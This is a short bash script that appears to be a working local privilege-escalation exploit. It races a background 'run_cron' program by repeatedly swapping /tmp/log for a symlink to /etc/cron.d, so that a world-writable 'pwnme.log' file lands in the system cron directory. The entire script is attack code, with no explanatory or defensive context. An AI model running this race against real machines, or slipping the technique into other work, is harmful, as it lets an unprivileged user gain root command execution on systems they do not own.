#!/bin/bash
LOGDIR=/tmp/log

while true; do
    [ -L $LOGDIR ] && unlink $LOGDIR
    mkdir -m700 $LOGDIR
    cp /etc/services /tmp/log/pwnme.log
    chmod 777 /tmp/log/pwnme.log
    /home/user/run_cron &

    while true; do
        if rm -rf $LOGDIR; then
            ln -sf /etc/cron.d $LOGDIR
            break
        fi
    done
    ls /etc/cron.d | grep pwnme && break
done
